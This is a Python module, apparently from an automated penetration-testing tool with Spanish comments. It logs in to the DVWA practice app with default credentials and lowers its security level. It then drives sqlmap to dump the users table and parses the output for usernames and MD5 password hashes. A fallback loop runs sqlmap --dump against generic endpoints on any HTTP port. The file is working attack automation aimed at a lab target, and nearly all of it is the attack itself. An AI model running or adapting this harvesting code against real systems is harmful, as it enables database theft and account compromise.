import subprocess
import re
import os
import requests
from pathlib import Path
from config import Config
from models.host import Host
from models.vuln import Vulnerability, RiskLevel
from rich import print as rprint


class SQLMapInjector:
    def __init__(self, host: Host):
        self.host = host
        self.sql_dir = Path(f"{Config.OUTPUT_BASE}/sqlmap")
        self.sql_dir.mkdir(parents=True, exist_ok=True)

    def _get_dvwa_cookie(self):
        """Login en DVWA y obtener cookie de sesión"""
        try:
            session = requests.Session()
            login_url = f"http://{self.host.ip}{Config.DVWA_LOGIN_URL}"

            resp = session.get(login_url, timeout=10)
            token_match = re.search(r"user_token'\s+value='([^']+)'", resp.text)
            token = token_match.group(1) if token_match else ''

            data = {
                'username': Config.DVWA_DEFAULT_USER,
                'password': Config.DVWA_DEFAULT_PASS,
                'Login': 'Login',
                'user_token': token
            }
            session.post(login_url, data=data, timeout=10)

            session.post(f"http://{self.host.ip}/dvwa/security.php",
                         data={'security': 'low', 'seclev_submit': 'Submit'},
                         timeout=10)

            cookies = session.cookies.get_dict()
            cookie_str = '; '.join([f"{k}={v}" for k, v in cookies.items()])
            if 'PHPSESSID' in cookies:
                rprint(f"   [green]🔑 Login DVWA OK (PHPSESSID={cookies['PHPSESSID'][:8]}...)[/green]")
                return cookie_str + '; security=low'
            return None
        except Exception as e:
            rprint(f"   [yellow]⚠️ Login DVWA fallido: {e}[/yellow]")
            return None

    def _find_all_credentials(self, output_dir, full_output):
        """Buscar credenciales en TODOS los sitios posibles"""
        creds = []

        # ══════════════════════════════════════
        # 1. BUSCAR EN ARCHIVOS CSV DE DUMP
        # SQLMap guarda CSVs en: output_dir/IP/dump/DB/TABLE.csv
        # ══════════════════════════════════════
        for root, dirs, files in os.walk(str(output_dir)):
            for fname in files:
                fpath = Path(root) / fname

                # Leer cualquier archivo CSV o de dump
                if fname.endswith('.csv') or 'dump' in root.lower() or 'users' in fname.lower():
                    try:
                        content = fpath.read_text(errors='ignore').strip()
                        if not content:
                            continue
                        rprint(f"   [cyan]📄 Archivo encontrado: {fpath.name}[/cyan]")

                        lines = content.split('\n')
                        for line in lines:
                            # Buscar hashes MD5 en cualquier línea
                            md5_matches = re.findall(r'([a-fA-F0-9]{32})', line)
                            if md5_matches:
                                # Extraer username de la misma línea
                                # Formatos posibles: user,hash | user,,hash | "user","hash"
                                clean = line.replace('"', '').replace("'", '')
                                parts = re.split(r'[,\t|]+', clean)
                                parts = [p.strip() for p in parts if p.strip()]

                                username = None
                                hash_val = md5_matches[0]

                                for p in parts:
                                    if not re.match(r'^[a-fA-F0-9]{32}$', p) and \
                                       not re.match(r'^\d+$', p) and \
                                       p.lower() not in ['user', 'username', 'password', 'pass',
                                                          'first_name', 'last_name', 'avatar',
                                                          'user_id', 'failed_login', 'last_login',
                                                          ''] and \
                                       len(p) > 1 and len(p) < 30 and \
                                       not p.startswith('/') and not p.startswith('http'):
                                        username = p
                                        break

                                if username and not any(c['user'] == username and c['hash'] == hash_val for c in creds):
                                    creds.append({
                                        'source': 'SQLMap (DVWA)',
                                        'user': username,
                                        'password': hash_val,
                                        'hash': hash_val,
                                        'cracked': False
                                    })
                    except Exception:
                        pass

        # ══════════════════════════════════════
        # 2. BUSCAR EN STDOUT + STDERR
        # ══════════════════════════════════════
        if full_output:
            # Patrón tabla: | algo | user | hash |
            table_rows = re.findall(
                r'\|[^|]*\|[^|]*?(\b\w{3,20}\b)[^|]*\|[^|]*?([a-fA-F0-9]{32})[^|]*\|',
                full_output
            )
            for user, hash_val in table_rows:
                if user.lower() not in ['user', 'username', 'password', 'field', 'column',
                                         'first_name', 'last_name', 'avatar', 'table']:
                    if not any(c['user'] == user and c['hash'] == hash_val for c in creds):
                        creds.append({
                            'source': 'SQLMap (DVWA)',
                            'user': user,
                            'password': hash_val,
                            'hash': hash_val,
                            'cracked': False
                        })

            # Buscar formato simple: username seguido de hash en la misma línea
            for line in full_output.split('\n'):
                if re.search(r'[a-fA-F0-9]{32}', line):
                    # Ignorar líneas de info/debug de sqlmap
                    if line.strip().startswith('[') or 'sqlmap' in line.lower():
                        continue
                    md5 = re.findall(r'([a-fA-F0-9]{32})', line)
                    words = re.findall(r'\b([a-zA-Z]\w{2,15})\b', line)
                    for word in words:
                        if word.lower() not in ['user', 'username', 'password', 'type', 'null',
                                                 'varchar', 'table', 'column', 'level', 'risk',
                                                 'first_name', 'last_name', 'avatar', 'http',
                                                 'string', 'boolean', 'blind', 'injectable',
                                                 'parameter', 'payload', 'fetched', 'entries',
                                                 'dump', 'database', 'found', 'data', 'text']:
                            for h in md5:
                                if not any(c['user'] == word and c['hash'] == h for c in creds):
                                    creds.append({
                                        'source': 'SQLMap (DVWA)',
                                        'user': word,
                                        'password': h,
                                        'hash': h,
                                        'cracked': False
                                    })
                            break  # Solo primer username por línea

        return creds

    def attack(self):
        vulns = []
        rprint("   [cyan]💉 SQLMap contra DVWA...[/cyan]")

        cookie = self._get_dvwa_cookie()

        for port, service in list(self.host.ports_open.items())[:3]:
            if 'http' not in service['service'].lower():
                continue

            output_dir = self.sql_dir / f"sql_{self.host.ip}_{port}"
            output_dir.mkdir(exist_ok=True)

            if cookie:
                dvwa_url = f"http://{self.host.ip}:{port}{Config.DVWA_SQLI_URL}?id=1&Submit=Submit"
                rprint(f"   [red]🎯 SQLMap DVWA: {dvwa_url}[/red]")

                # Comando específico: dump tabla users de dvwa
                cmd = [
                    'sqlmap', '-u', dvwa_url,
                    '--cookie', cookie,
                    '--batch', '--risk=2', '--level=2',
                    '-D', 'dvwa', '-T', 'users',
                    '-C', 'user,password',
                    '--dump',
                    '--dump-format=CSV',
                    '--threads=3',
                    f'--output-dir={output_dir}'
                ]

                try:
                    # Capturar TANTO stdout COMO stderr
                    result = subprocess.run(
                        cmd,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.STDOUT,
                        text=True,
                        timeout=300
                    )
                    full_output = result.stdout or ''

                    # Guardar SIEMPRE el output completo para debug
                    debug_file = output_dir / "sqlmap_full_output.txt"
                    debug_file.write_text(full_output, errors='ignore')

                    is_injectable = any(kw in full_output.lower() for kw in
                                        ['injectable', 'dumped', 'entries', 'fetched'])

                    if is_injectable:
                        vuln = Vulnerability(
                            name="💉 SQL INJECTION + DUMP CREDENCIALES",
                            description=f"SQLi en DVWA: {dvwa_url} → Volcado tabla users",
                            port=port,
                            risk=RiskLevel.CRITICAL,
                            evidence_file=str(output_dir),
                            recommendations="Usar prepared statements, validar inputs, WAF"
                        )
                        vulns.append(vuln)
                        rprint(f"   [bold red]💥 SQLi CRÍTICO + DUMP EXITOSO![/bold red]")

                    # SIEMPRE intentar extraer credenciales (del output y de archivos)
                    creds = self._find_all_credentials(output_dir, full_output)

                    if creds:
                        self.host.credentials.extend(creds)
                        rprint(f"\n   [bold green]{'='*50}[/bold green]")
                        rprint(f"   [bold green]🔑 {len(creds)} CREDENCIALES EXTRAÍDAS:[/bold green]")
                        rprint(f"   [bold green]{'='*50}[/bold green]")
                        for c in creds:
                            rprint(f"   [green]   👤 {c['user']} : {c['password']}[/green]")
                    else:
                        rprint(f"   [yellow]⚠️ No se parsearon credenciales automáticamente[/yellow]")
                        rprint(f"   [yellow]   Output guardado: {debug_file}[/yellow]")
                        rprint(f"   [yellow]   Revisar: cat {debug_file}[/yellow]")

                        # Listar archivos creados por sqlmap
                        rprint(f"   [cyan]📁 Archivos en {output_dir}:[/cyan]")
                        for root, dirs, files in os.walk(str(output_dir)):
                            for f in files:
                                fp = Path(root) / f
                                size = fp.stat().st_size
                                rprint(f"   [cyan]   {fp.relative_to(output_dir)} ({size} bytes)[/cyan]")

                except subprocess.TimeoutExpired:
                    rprint(f"   [yellow]⏰ SQLMap timeout (300s)[/yellow]")
                except Exception as e:
                    rprint(f"   [yellow]⚠️ Error SQLMap: {e}[/yellow]")

            # FALLBACK: endpoints genéricos
            for endpoint in Config.SQL_ENDPOINTS:
                url = f"http://{self.host.ip}:{port}{endpoint}"
                fb_output = output_dir / "generic"
                fb_output.mkdir(exist_ok=True)

                cmd = [
                    'sqlmap', '-u', url,
                    '--batch', '--risk=2', '--level=2',
                    '--dump', '--dump-format=CSV',
                    '--threads=3',
                    f'--output-dir={fb_output}'
                ]

                try:
                    result = subprocess.run(
                        cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                        text=True, timeout=120
                    )
                    if 'injectable' in result.stdout.lower():
                        vuln = Vulnerability(
                            name="💉 SQL INJECTION CONFIRMADA",
                            description=f"SQLi en: {url}",
                            port=port,
                            risk=RiskLevel.CRITICAL,
                            evidence_file=str(fb_output),
                            recommendations="Prepared Statements, WAF"
                        )
                        vulns.append(vuln)
                        rprint(f"   [bold red]💥 SQLi CRÍTICO en {endpoint}![/bold red]")

                        creds = self._find_all_credentials(fb_output, result.stdout)
                        if creds:
                            self.host.credentials.extend(creds)
                except Exception:
                    pass

        return vulns
